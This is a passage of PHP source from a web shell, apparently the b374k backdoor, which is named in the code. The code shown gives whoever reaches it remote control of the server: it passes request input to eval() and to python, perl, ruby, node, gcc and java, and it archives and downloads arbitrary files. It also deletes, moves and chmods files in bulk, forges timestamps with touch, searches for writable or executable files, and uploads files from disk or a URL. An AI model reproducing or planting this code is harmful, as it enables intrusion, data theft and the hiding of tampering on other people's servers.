 994            }
 995        }
 996    }
 997 
 998    if(!empty($_GP['dltype']) && !empty($_GP['dlpath'])){
 999        ob_end_clean();
1000        $s_dltype = $_GP['dltype'];
1001        $s_dlpath = $_GP['dlpath'];
1002 
1003        $s_dlname = basename($s_dlpath);
1004        if($s_dlpath==".") $s_dlname = basename($s_cwd);
1005        elseif($s_dlpath==".."){
1006            chdir("..");
1007            $s_dlname=basename(getcwd());
1008            chdir($s_cwd);
1009        }
1010        $s_tmpdir = get_writabledir();
1011        $s_dlarchive = $s_tmpdir.$s_dlname;
1012        $s_dlthis = "";
1013        if($s_dltype=="ziparchive"){
1014            $s_dlarchive .= ".zip";
1015            if(zip($s_dlpath,$s_dlarchive)) $s_dlthis = $s_dlarchive;
1016        }
1017        elseif($s_dltype=="tar"){
1018            $s_dlarchive .= ".tar";
1019            $s_dlarchive = str_replace('\\', '/', $s_dlarchive);
1020            exe("tar cf ".$s_dlarchive." ".$s_dlpath);
1021            $s_dlthis = $s_dlarchive;
1022        }
1023        elseif($s_dltype=="targz"){
1024            $s_dlarchive .= ".tar.gz";
1025            $s_dlarchive = str_replace('\\', '/', $s_dlarchive);
1026            exe("tar czf ".$s_dlarchive." ".$s_dlpath);
1027            $s_dlthis = $s_dlarchive;
1028        }
1029        elseif($s_dltype=="raw"){
1030            if(@is_file($s_dlpath)) $s_dlthis = $s_dlpath;
1031        }
1032 
1033        if(@is_file($s_dlthis)){
1034            header("Content-Type: application/octet-stream");
1035            header('Content-Transfer-Encoding: binary');
1036            header("Content-length: ".@filesize($s_dlthis));
1037            header("Content-disposition: attachment; filename=\"".basename($s_dlthis)."\";");
1038            $s_file = @fopen($s_dlthis,"rb");
1039            while(!feof($s_file)){
1040                print(@fread($s_file, 1024*8));
1041                ob_flush();
1042                flush();
1043            }
1044            fclose($s_file);
1045 
1046            if($s_dltype!="raw"){
1047                rename($s_dlthis,$s_dlthis."del");
1048                unlink($s_dlthis."del");
1049            }
1050            die();
1051        }
1052    }
1053    // download file specified by ?dl=&lt;file&gt;
1054    if(isset($_GP['dl']) && ($_GP['dl'] != "")){
1055        ob_end_clean();
1056        $f = $_GP['dl'];
1057        $fc = file_get_contents($f);
1058        header("Content-type: application/octet-stream");
1059        header("Content-length: ".strlen($fc));
1060        header("Content-disposition: attachment; filename=\"".basename($f)."\";");
1061        echo $fc;
1062        die();
1063    }
1064    // massact
1065    if(isset($_GP['z'])){
1066        $s_massact = isset($_COOKIE['massact'])? $_COOKIE['massact']:"";
1067        $s_buffer = isset($_COOKIE['buffer'])? rtrim(ss($_COOKIE['buffer']),"|"):"";
1068        $s_lists = explode("|", $s_buffer);
1069 
1070        $s_counter = 0;
1071        if(!empty($s_buffer)){
1072            if($_GP['z']=='moveok'){
1073                foreach($s_lists as $s_l) if(rename($s_l,$s_cwd.basename($s_l))) $s_counter++;
1074                if($s_counter&gt;0) $s_result .= notif($s_counter." items moved");
1075                else $s_result .= notif("No items moved");
1076            }
1077            elseif($_GP['z']=='copyok'){
1078                foreach($s_lists as $s_l){
1079                    if(@is_dir($s_l)){
1080                        copys($s_l,$s_cwd.basename($s_l));
1081                        if(file_exists($s_cwd.basename($s_l))) $s_counter++;
1082                    }
1083                    elseif(@is_file($s_l)){
1084                        copy($s_l,$s_cwd.basename($s_l));
1085                        if(file_exists($s_cwd.basename($s_l))) $s_counter++;
1086                    }
1087                }
1088                if($s_counter&gt;0) $s_result .= notif($s_counter." items copied");
1089                else $s_result .= notif("No items copied");
1090            }
1091            elseif($_GP['z']=='delok'){
1092                foreach($s_lists as $s_l){
1093                    if(@is_file($s_l)){
1094                        if(unlink($s_l)) $s_counter++;
1095                    }
1096                    elseif(@is_dir($s_l)){
1097                        rmdirs($s_l);
1098                        if(!file_exists($s_l)) $s_counter++;
1099                    }
1100                }
1101                if($s_counter&gt;0) $s_result .= notif($s_counter." items deleted");
1102                else $s_result .= notif("No items deleted");
1103            }
1104            elseif(isset($_GP['chmodok'])){
1105                $s_mod = octdec($_GP['chmodok']);
1106                foreach($s_lists as $s_l) if(chmod($s_l,$s_mod)) $s_counter++;
1107                if($s_counter&gt;0) $s_result .= notif($s_counter." items changed mode to ".decoct($s_mod));
1108                else $s_result .= notif("No items modified");
1109            }
1110            elseif(isset($_GP['touchok'])){
1111                $s_datenew = strtotime($_GP['touchok']);
1112                foreach($s_lists as $s_l) if(touch($s_l,$s_datenew)) $s_counter++;
1113                if($s_counter&gt;0) $s_result .= notif($s_counter." items changed access and modification time to ".@date("d-M-Y H:i:s",$s_datenew));
1114                else $s_result .= notif("No items modified");
1115            }
1116            elseif(isset($_GP['compresszipok'])){
1117                $s_file = $_GP['compresszipok'];
1118                if(zip($s_lists, $s_file)) $s_result .= notif("Archive created : ".$s_file);
1119                else $s_result .= notif("Error creating archive file");
1120            }
1121            elseif(isset($_GP['compresstarok'])){
1122                $s_lists_ = array();
1123                $s_file = $_GP['compresstarok'];
1124                $s_file = basename($s_file);
1125 
1126                $s_lists__ = array_map("basename", $s_lists);
1127                $s_lists_ = array_map("pf", $s_lists__);
1128                exe("tar cf \"".$s_file."\" ".implode(" ", $s_lists_));
1129 
1130                if(@is_file($s_file)) $s_result .= notif("Archive created : ".$s_file);
1131                else $s_result .= notif("Error creating archive file");
1132            }
1133            elseif(isset($_GP['compresstargzok'])){
1134                $s_lists_ = array();
1135                $s_file = $_GP['compresstargzok'];
1136                $s_file = basename($s_file);
1137 
1138                $s_lists__ = array_map("basename", $s_lists);
1139                $s_lists_ = array_map("pf", $s_lists__);
1140                exe("tar czf \"".$s_file."\" ".implode(" ", $s_lists_));
1141 
1142                if(@is_file($s_file)) $s_result .= notif("Archive created : ".$s_file);
1143                else $s_result .= notif("Error creating archive file");
1144            }
1145            elseif(isset($_GP['extractzipok'])){
1146                $s_file = $_GP['extractzipok'];
1147                $zip = new ZipArchive();
1148                foreach($s_lists as $f){
1149                    $s_target = $s_file.basename($f,".zip");
1150                    if($zip-&gt;open($f)){
1151                        if(!@is_dir($s_target)) @mkdir($s_target);
1152                        if($zip-&gt;extractTo($s_target)) $s_result .= notif("Files extracted to ".$s_target);
1153                        else $s_result .= notif("Error extrating archive file");
1154                        $zip-&gt;close();
1155                    }
1156                    else $s_result .= notif("Error opening archive file");
1157                }
1158            }
1159            elseif(isset($_GP['extracttarok'])){
1160                $s_file = $_GP['extracttarok'];
1161                foreach($s_lists as $f){
1162                    $s_target = "";
1163                    $s_target = basename($f,".tar");
1164                    if(!@is_dir($s_target)) @mkdir($s_target);
1165                    exe("tar xf \"".basename($f)."\" -C \"".$s_target."\"");
1166                }
1167            }
1168            elseif(isset($_GP['extracttargzok'])){
1169                $s_file = $_GP['extracttargzok'];
1170                foreach($s_lists as $f){
1171                    $s_target = "";
1172                    if(strpos(strtolower($f), ".tar.gz")!==false) $s_target = basename($f,".tar.gz");
1173                    elseif(strpos(strtolower($f), ".tgz")!==false) $s_target = basename($f,".tgz");
1174                    if(!@is_dir($s_target)) @mkdir($s_target);
1175                    exe("tar xzf \"".basename($f)."\" -C \"".$s_target."\"");
1176                }
1177            }
1178        }
1179        setcookie("buffer", "" ,time() - $s_login_time);
1180        setcookie("massact", "" ,time() - $s_login_time);
1181    }
1182    if(isset($_GP['y'])){
1183        $s_massact = isset($_COOKIE['massact'])? $_COOKIE['massact']:"";
1184        $s_buffer = isset($_COOKIE['buffer'])? rtrim(ss($_COOKIE['buffer']),"|"):"";
1185        $s_lists = explode("|", $s_buffer);
1186 
1187        if(!empty($s_buffer)){
1188            if($_GP['y']=='delete'){
1189                $s_result .= notif("Delete ? &lt;a href='".$s_self."z=delok'&gt;Yes&lt;/a&gt; | &lt;a href='".$s_self."'&gt;No&lt;/a&gt;");
1190                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1191            }
1192            elseif($_GP['y']=='paste' && $s_massact=='cut'){
1193                $s_result .= notif("Move here ? &lt;a href='".$s_self."z=moveok'&gt;Yes&lt;/a&gt; | &lt;a href='".$s_self."'&gt;No&lt;/a&gt;");
1194                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1195            }
1196            elseif($_GP['y']=='paste' && $s_massact=='copy'){
1197                $s_result .= notif("Copy here ? &lt;a href='".$s_self."z=copyok'&gt;Yes&lt;/a&gt; | &lt;a href='".$s_self."'&gt;No&lt;/a&gt;");
1198                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1199            }
1200            elseif($_GP['y']=='chmod'){
1201                $s_result .= notif("Permissions ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='0755' name='chmodok' style='width:30px;text-align:center;' maxlength='4' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
1202                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1203            }
1204            elseif($_GP['y']=='touch'){
1205                $s_result .= notif("Touch ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".@date("d-M-Y H:i:s",time())."' name='touchok' style='width:130px;text-align:center;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
1206                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1207            }
1208            elseif($_GP['y']=='extractzip'){
1209                $s_result .= notif("Extract to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd."' name='extractzipok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
1210                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1211            }
1212            elseif($_GP['y']=='extracttar'){
1213                $s_result .= notif("Extract to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd."' name='extracttarok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
1214                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1215            }
1216            elseif($_GP['y']=='extracttargz'){
1217                $s_result .= notif("Extract to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd."' name='extracttargzok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
1218                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1219            }
1220            elseif($_GP['y']=='compresszip'){
1221                $s_result .= notif("Compress to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".zip' name='compresszipok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
1222                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1223            }
1224            elseif($_GP['y']=='compresstar'){
1225                $s_result .= notif("Compress to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".tar' name='compresstarok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
1226                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1227            }
1228            elseif($_GP['y']=='compresstargz'){
1229                $s_result .= notif("Compress to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".tar.gz' name='compresstargzok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
1230                foreach($s_lists as $s_l) $s_result .= notif($s_l);
1231            }
1232        }
1233    }
1234 
1235    // view image specified by ?img=&lt;file&gt;
1236    if(isset($_GP['img'])){
1237        ob_end_clean();
1238        $s_d = isset($_GP['d'])? $_GP['d']:"";
1239        $s_f = $_GP['img'];
1240        $s_inf = @getimagesize($s_d.$s_f);
1241        $s_ext = explode($s_f, ".");
1242        $s_ext = $s_ext[count($s_ext)-1];
1243        header("Content-type: ".$s_inf["mime"]);
1244        header("Cache-control: public");
1245        header("Expires: ".@date("r", @mktime(0,0,0,1,1,2030)));
1246        header("Cache-control: max-age=".(60*60*24*7));#
1247        readfile($s_d.$s_f);
1248        die();
1249    } // rename file or folder
1250    elseif(isset($_GP['oldname']) && isset($_GP['rename'])){
1251        $s_old = $_GP['oldname'];
1252        $s_new = $_GP['rename'];
1253 
1254        $s_renmsg = "";
1255        if(@is_dir($s_old)) $s_renmsg = (@rename($s_old, $s_new))? "Directory ".$s_old." renamed to ".$s_new : "Unable to rename directory ".$s_old." to ".$s_new;
1256        elseif(@is_file($s_old)) $s_renmsg = (@rename($s_old, $s_new))? "File ".$s_old." renamed to ".$s_new : "Unable to rename file ".$s_old." to ".$s_new;
1257        else $s_renmsg = "Cannot find the path specified ".$s_old;
1258 
1259        $s_result .= notif($s_renmsg);
1260        $s_fnew = $s_new;
1261    } // confirm delete
1262    elseif(!empty($_GP['del'])){
1263        $s_del = trim($_GP['del']);
1264        $s_result .= notif("Delete ".basename($s_del)." ? &lt;a href='".$s_self."delete=".$s_del."'&gt;Yes&lt;/a&gt; | &lt;a href='".$s_self."'&gt;No&lt;/a&gt;");
1265    } // delete file
1266    elseif(!empty($_GP['delete'])){
1267        $s_f = $_GP['delete'];
1268        $s_delmsg = "";
1269 
1270        if(@is_file($s_f)) $s_delmsg = (unlink($s_f))? "File removed : ".$s_f : "Unable to remove file ".$s_f;
1271        elseif(@is_dir($s_f)){
1272            rmdirs($s_f);
1273            $s_delmsg = (@is_dir($s_f))? "Unable to remove directory ".$s_f : "Directory removed : ".$s_f;
1274        }
1275        else $s_delmsg = "Cannot find the path specified ".$s_f;
1276        $s_result .= notif($s_delmsg);
1277    } // create dir
1278    elseif(!empty($_GP['mkdir'])){
1279        $s_f = $s_cwd.$_GP['mkdir'];
1280        $s_dirmsg = "";
1281 
1282        $s_num = 1;
1283        if(@is_dir($s_f)){
1284            $s_pos = strrpos($s_f,"_");
1285            if($s_pos!==false) $s_num = (int) substr($s_f, $s_pos+1);
1286            while(@is_dir(substr($s_f, 0, $s_pos)."_".$s_num)){
1287                $s_num++;
1288            }
1289            $s_f = substr($s_f, 0, $s_pos)."_".$s_num;
1290        }
1291        if(mkdir($s_f)) $s_dirmsg = "Directory created ".$s_f;
1292        else $s_dirmsg = "Unable to create directory ".$s_f;
1293 
1294        $s_result .= notif($s_dirmsg);
1295    } // php eval() function
1296    if(isset($_GP['x']) && ($_GP['x']=='eval')){
1297        $s_code = "";
1298        $s_res = "";
1299        $s_evaloption = "";
1300        $s_lang = "php";
1301 
1302        if(isset($_GP['evalcode'])){
1303            $s_code = $_GP['evalcode'];
1304            $s_evaloption = (isset($_GP['evaloption']))? $_GP['evaloption']:"";
1305            $s_tmpdir = get_writabledir();
1306 
1307            if(isset($_GP['lang'])){$s_lang = $_GP['lang'];}
1308 
1309            if(strtolower($s_lang)=='php'){
1310                ob_start();
1311                eval($s_code);
1312                $s_res = ob_get_contents();
1313                ob_end_clean();
1314            }
1315            elseif(strtolower($s_lang)=='python'||strtolower($s_lang)=='perl'||strtolower($s_lang)=='ruby'||strtolower($s_lang)=='node'){
1316                $s_rand = md5(time().rand(0,100));
1317                $s_script = $s_tmpdir.$s_rand;
1318                if(file_put_contents($s_script, $s_code)!==false){
1319                    $s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
1320                    unlink($s_script);
1321                }
1322            }
1323            elseif(strtolower($s_lang)=='gcc'){
1324                $s_script = md5(time().rand(0,100));
1325                chdir($s_tmpdir);
1326                if(file_put_contents($s_script.".c", $s_code)!==false){
1327                    $s_scriptout = $s_win ? $s_script.".exe" : $s_script;
1328                    $s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout.$s_evaloption);
1329                    if(@is_file($s_scriptout)){
1330                        $s_res = $s_win ? exe($s_scriptout):exe("chmod +x ".$s_scriptout." ; ./".$s_scriptout);
1331                        rename($s_scriptout, $s_scriptout."del");
1332                        unlink($s_scriptout."del");
1333                    }
1334                    unlink($s_script.".c");
1335                }
1336                chdir($s_cwd);
1337            }
1338            elseif(strtolower($s_lang)=='java'){
1339                if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
1340                    $s_classname = trim($s_r[1]);
1341                    $s_script = $s_classname;
1342                }
1343                else{
1344                    $s_rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
1345                    $s_script = $s_rand;
1346                    $s_code = "class ".$s_rand." { ".$s_code . " } ";
1347                }
1348                chdir($s_tmpdir);
1349                if(file_put_contents($s_script.".java", $s_code)!==false){
1350                    $s_res = exe("javac ".$s_script.".java");
1351                    if(@is_file($s_script.".class")){
1352                        $s_res .= exe("java ".$s_evaloption." ".$s_script);
1353                        unlink($s_script.".class");
1354                    }
1355                    unlink($s_script.".java");
1356                }
1357                chdir($s_pwd);
1358            }
1359        }
1360 
1361        $s_lang_available = "&lt;option value='php'&gt;php&lt;/option&gt;";
1362        $s_selected = "";
1363        $s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_gcc", "s_java");
1364        foreach($s_access as $s){
1365            if(isset($$s)){
1366                $s_t = explode("_", $s);
1367                $s_checked = ($s_lang == $s_t[1])? "selected" : "";
1368                $s_lang_available .= "&lt;option value='".$s_t[1]."' ".$s_checked."&gt;".$s_t[1]."&lt;/option&gt;";
1369            }
1370        }
1371 
1372        $s_evaloptionclass = ($s_lang=="php")? "sembunyi":"";
1373        $s_e_result = (!empty($s_res))? "&lt;pre id='evalres' class='border-top' style='margin:4px 0 0 0;padding:6px 0;' &gt;".hss($s_res)."&lt;/pre&gt;":"";
1374        $s_result .= "&lt;form action='".$s_self."' method='post'&gt;
1375                   &lt;textarea id='evalcode' name='evalcode' style='height:150px;' class='txtarea'&gt;".hss($s_code)."&lt;/textarea&gt;
1376                   &lt;table&gt;&lt;tr&gt;&lt;td style='padding:0;'&gt;&lt;p&gt;&lt;input type='submit' name='evalcodesubmit' class='inputzbut' value='Go !' style='width:120px;height:30px;' /&gt;&lt;/p&gt;
1377                   &lt;/td&gt;&lt;td&gt;&lt;select name='lang' onchange='evalselect(this);' class='inputzbut' style='width:120px;height:30px;padding:4px;'&gt;
1378                   ".$s_lang_available."
1379                   &lt;/select&gt;
1380                   &lt;/td&gt;
1381                   &lt;td&gt;&lt;div title='If you want to give additional option to interpreter or compiler, give it here' id='additionaloption' class='".$s_evaloptionclass."'&gt;Additional option&nbsp;&nbsp;&lt;input class='inputz' style='width:400px;' type='text' name='evaloption' value='".$s_evaloption."' id='evaloption' /&gt;&lt;/div&gt;&lt;/td&gt;
1382                   &lt;/tr&gt;
1383                   &lt;/table&gt;
1384                   ".$s_e_result."
1385                   &lt;input type='hidden' name='x' value='eval' /&gt;
1386                   &lt;/form&gt;";
1387    } // find
1388    elseif(isset($_GP['find'])){
1389        $s_p = $_GP['find'];
1390 
1391        $s_type = isset($_GP['type'])? $_GP['type'] : "sfile";
1392        $s_sfname = (!empty($_GP['sfname']))? $_GP['sfname']:'';
1393        $s_sdname = (!empty($_GP['sdname']))? $_GP['sdname']:'';
1394        $s_sfcontain = (!empty($_GP['sfcontain']))? $_GP['sfcontain']:'';
1395 
1396        $s_sfnameregexchecked = $s_sfnameicasechecked = $s_sdnameregexchecked = $s_sdnameicasechecked = $s_sfcontainregexchecked = $s_sfcontainicasechecked = $s_swritablechecked = $s_sreadablechecked = $s_sexecutablechecked = "";
1397        $s_sfnameregex = $s_sfnameicase = $s_sdnameregex = $s_sdnameicase = $s_sfcontainregex = $s_sfcontainicase = $s_swritable = $s_sreadable = $s_sexecutable = false;
1398 
1399        if(isset($_GP['sfnameregex'])){ $s_sfnameregex=true; $s_sfnameregexchecked="checked"; }
1400        if(isset($_GP['sfnameicase'])){ $s_sfnameicase=true; $s_sfnameicasechecked="checked"; }
1401        if(isset($_GP['sdnameregex'])){ $s_sdnameregex=true; $s_sdnameregexchecked="checked"; }
1402        if(isset($_GP['sdnameicase'])){ $s_sdnameicase=true; $s_sdnameicasechecked="checked"; }
1403        if(isset($_GP['sfcontainregex'])){ $s_sfcontainregex=true; $s_sfcontainregexchecked="checked"; }
1404        if(isset($_GP['sfcontainicase'])){ $s_sfcontainicase=true; $s_sfcontainicasechecked="checked"; }
1405        if(isset($_GP['swritable'])){ $s_swritable=true; $s_swritablechecked="checked"; }
1406        if(isset($_GP['sreadable'])){ $s_sreadable=true; $s_sreadablechecked="checked"; }
1407        if(isset($_GP['sexecutable'])){ $s_sexecutable=true; $s_sexecutablechecked="checked"; }
1408 
1409        $s_sexecb = (function_exists("is_executable"))? "&lt;input class='css-checkbox' type='checkbox' name='sexecutable' value='sexecutable' id='se' ".$s_sexecutablechecked." /&gt;&lt;label class='css-label' for='se'&gt;Executable&lt;/span&gt;":"";
1410 
1411        $s_candidate = array();
1412        if(isset($_GP['sgo'])){
1413            $s_af = "";
1414 
1415            $s_candidate = getallfiles($s_p);
1416            if($s_type=='sfile') $s_candidate = @array_filter($s_candidate, "is_file");
1417            elseif($s_type=='sdir') $s_candidate = @array_filter($s_candidate, "is_dir");
1418 
1419            foreach($s_candidate as $s_a){
1420                if($s_type=='sdir'){
1421                    if(!empty($s_sdname)){
1422                        if($s_sdnameregex){
1423                            if($s_sdnameicase){if(!preg_match("/".$s_sdname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
1424                            else{if(!preg_match("/".$s_sdname."/", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
1425                        }
1426                        else{
1427                            if($s_sdnameicase){if(strpos(strtolower(basename($s_a)), strtolower($s_sdname))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
1428                            else{if(strpos(basename($s_a), $s_sdname)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
1429                        }
1430                    }
1431                }
1432                elseif($s_type=='sfile'){
1433                    if(!empty($s_sfname)){
1434                        if($s_sfnameregex){
1435                            if($s_sfnameicase){if(!preg_match("/".$s_sfname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
1436                            else{if(!preg_match("/".$s_sfname."/", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
1437                        }
1438                        else{
1439                            if($s_sfnameicase){if(strpos(strtolower(basename($s_a)), strtolower($s_sfname))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
1440                            else{if(strpos(basename($s_a), $s_sfname)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
1441                        }
1442                    }
1443                    if(!empty($s_sfcontain)){
1444                        $s_sffcontent = @file_get_contents($s_a);
1445                        if($s_sfcontainregex){
1446                            if($s_sfcontainicase){if(!preg_match("/".$s_sfcontain."/i", $s_sffcontent)) $s_candidate = array_diff($s_candidate, array($s_a));}
1447                            else{if(!preg_match("/".$s_sfcontain."/",  $s_sffcontent)) $s_candidate = array_diff($s_candidate, array($s_a));}
1448                        }
1449                        else{
1450                            if($s_sfcontainicase){if(strpos(strtolower($s_sffcontent), strtolower($s_sfcontain))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
1451                            else{if(strpos($s_sffcontent, $s_sfcontain)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
1452                        }
1453                    }
1454                }
1455            }
1456        }
1457 
1458        $s_f_result = ""; $s_link="";
1459        foreach($s_candidate as $s_c){
1460            $s_c = trim($s_c);
1461            if($s_swritable && !@is_writable($s_c)) continue;
1462            if($s_sreadable && !@is_readable($s_c)) continue;
1463            if($s_sexecutable && !@is_executable($s_c)) continue;
1464 
1465            if($s_type=="sfile") $s_link = $s_self."view=".$s_c;
1466            elseif($s_type=="sdir") $s_link = $s_self."view=".cp($s_c);
1467            $s_f_result .= "&lt;p class='notif' ondblclick=\"return go('".adds($s_link)."',event);\"&gt;&lt;a href='".$s_link."'&gt;".$s_c."&lt;/a&gt;&lt;/p&gt;";
1468        }
1469 
1470        $s_tsdir = ($s_type=="sdir")? "selected":"";
1471        $s_tsfile = ($s_type=="sfile")? "selected":"";
1472 
1473        if(!@is_dir($s_p)) $s_result .= notif("Cannot find the path specified ".$s_p);
1474 
1475        $s_result .= "&lt;form action='".$s_self."' method='post'&gt;
1476       &lt;div class='mybox'&gt;&lt;h2&gt;Find&lt;/h2&gt;
1477       &lt;table class='myboxtbl'&gt;
1478       &lt;tr&gt;&lt;td style='width:140px;'&gt;Search in&lt;/td&gt;
1479       &lt;td colspan='2'&gt;&lt;input style='width:100%;' value='".$s_p."' class='inputz' type='text' name='find' /&gt;&lt;/td&gt;&lt;/tr&gt;
1480       &lt;tr onclick=\"findtype('sdir');\"&gt;
1481           &lt;td&gt;Dirname contains&lt;/td&gt;
1482           &lt;td style='width:400px;'&gt;&lt;input class='inputz' style='width:100%;' type='text' name='sdname' value='".$s_sdname."' /&gt;&lt;/td&gt;
1483           &lt;td&gt;
1484               &lt;input type='checkbox' class='css-checkbox' name='sdnameregex' id='sdn' ".$s_sdnameregexchecked." /&gt;&lt;label class='css-label' for='sdn'&gt;Regex (pcre)&lt;/label&gt;
1485               &lt;input type='checkbox' class='css-checkbox' name='sdnameicase' id='sdi' ".$s_sdnameicasechecked." /&gt;&lt;label class='css-label' for='sdi'&gt;Case Insensitive&lt;/label&gt;
1486           &lt;/td&gt;
1487       &lt;/tr&gt;
1488       &lt;tr onclick=\"findtype('sfile');\"&gt;
1489           &lt;td&gt;Filename contains&lt;/td&gt;
1490           &lt;td style='width:400px;'&gt;&lt;input class='inputz' style='width:100%;' type='text' name='sfname' value='".$s_sfname."' /&gt;&lt;/td&gt;
1491           &lt;td&gt;
1492               &lt;input type='checkbox' class='css-checkbox' name='sfnameregex'  id='sfn' ".$s_sfnameregexchecked." /&gt;&lt;label class='css-label' for='sfn'&gt;Regex (pcre)&lt;/label&gt;
1493               &lt;input type='checkbox' class='css-checkbox' name='sfnameicase'  id='sfi' ".$s_sfnameicasechecked." /&gt;&lt;label class='css-label' for='sfi'&gt;Case Insensitive&lt;/label&gt;
1494           &lt;/td&gt;
1495       &lt;/tr&gt;
1496       &lt;tr onclick=\"findtype('sfile');\"&gt;
1497           &lt;td&gt;File contains&lt;/td&gt;
1498           &lt;td style='width:400px;'&gt;&lt;input class='inputz' style='width:100%;' type='text' name='sfcontain' value='".$s_sfcontain."' /&gt;&lt;/td&gt;
1499           &lt;td&gt;
1500               &lt;input type='checkbox' class='css-checkbox' name='sfcontainregex' id='sff' ".$s_sfcontainregexchecked." /&gt;&lt;label class='css-label' for='sff'&gt;Regex (pcre)&lt;/label&gt;
1501               &lt;input type='checkbox' class='css-checkbox' name='sfcontainicase' id='sffi' ".$s_sfcontainicasechecked." /&gt;&lt;label class='css-label' for='sffi'&gt;Case Insensitive&lt;/label&gt;
1502           &lt;/td&gt;
1503       &lt;/tr&gt;
1504       &lt;tr&gt;
1505           &lt;td&gt;Permissions&lt;/td&gt;
1506           &lt;td colspan='2'&gt;
1507               &lt;input type='checkbox' class='css-checkbox' name='swritable' id='sw' ".$s_swritablechecked." /&gt;&lt;label class='css-label' for='sw'&gt;Writable&lt;/label&gt;
1508               &lt;input type='checkbox' class='css-checkbox' name='sreadable' id='sr' ".$s_sreadablechecked." /&gt;&lt;label class='css-label' for='sr'&gt;Readable&lt;/label&gt;
1509               ".$s_sexecb."
1510           &lt;/td&gt;
1511       &lt;/tr&gt;
1512       &lt;tr&gt;&lt;td&gt;
1513       &lt;input type='submit' name='sgo' class='inputzbut' value='Search !' style='width:120px;height:30px;margin:0;' /&gt;
1514       &lt;/td&gt;
1515       &lt;td&gt;
1516       &lt;select name='type' id='type' class='inputzbut' style='width:120px;height:30px;margin:0;padding:4px;'&gt;
1517           &lt;option value='sfile' ".$s_tsfile."&gt;Search file&lt;/option&gt;
1518           &lt;option value='sdir' ".$s_tsdir."&gt;Search dir&lt;/option&gt;
1519       &lt;/select&gt;
1520       &lt;/td&gt;
1521       &lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
1522       &lt;/table&gt;
1523       &lt;/div&gt;
1524       &lt;/form&gt;
1525       &lt;div&gt;
1526       ".$s_f_result."
1527       &lt;/div&gt;";
1528    } // upload
1529    elseif(isset($_GP['x']) && ($_GP['x']=='upload')){
1530        $s_result = " ";
1531        $s_msg = "";
1532        if(isset($_GP['uploadhd'])){
1533            $c = count($_FILES['filepath']['name']);
1534            for($i = 0; $i&lt;$c; $i++){
1535                $s_fn = $_FILES['filepath']['name'][$i];
1536                if(empty($s_fn)) continue;
1537                if(is_uploaded_file($_FILES['filepath']['tmp_name'][$i])){
1538                    $s_p = cp($_GP['savefolder'][$i]);
1539                    if(!@is_dir($s_p)) mkdir($s_p);
1540                    if(isset($_GP['savefilename'][$i]) && (trim($_GP['savefilename'][$i])!="")) $s_fn = $_GP['savefilename'][$i];
1541                    $s_tm = $_FILES['filepath']['tmp_name'][$i];
1542                    $s_pi = cp($s_p).$s_fn;
1543                    $s_st = @move_uploaded_file($s_tm,$s_pi);
1544                    if($s_st) $s_msg .= notif("File uploaded to &lt;a href='".$s_self."view=".$s_pi."'&gt;".$s_pi."&lt;/a&gt;");
1545                    else $s_msg .= notif("Failed to upload ".$s_fn);
1546                }
1547                else $s_msg .= notif("Failed to upload ".$s_fn);
1548            }
1549        }
1550        elseif(isset($_GP['uploadurl'])){
1551            // function dlfile($s_url,$s_fpath)
1552            $c = count($_GP['fileurl']);
1553            for($i = 0; $i&lt;$c; $i++){
1554                $s_fu = $_GP['fileurl'][$i];
1555                if(empty($s_fu)) continue;
1556 
1557                $s_p = cp($_GP['savefolderurl'][$i]);
1558                if(!@is_dir($s_p)) mkdir($s_p);
1559 
1560                $s_fn = basename($s_fu);
1561                if(isset($_GP['savefilenameurl'][$i]) && (trim($_GP['savefilenameurl'][$i])!="")) $s_fn = $_GP['savefilenameurl'][$i];
1562                $s_fp = cp($s_p).$s_fn;
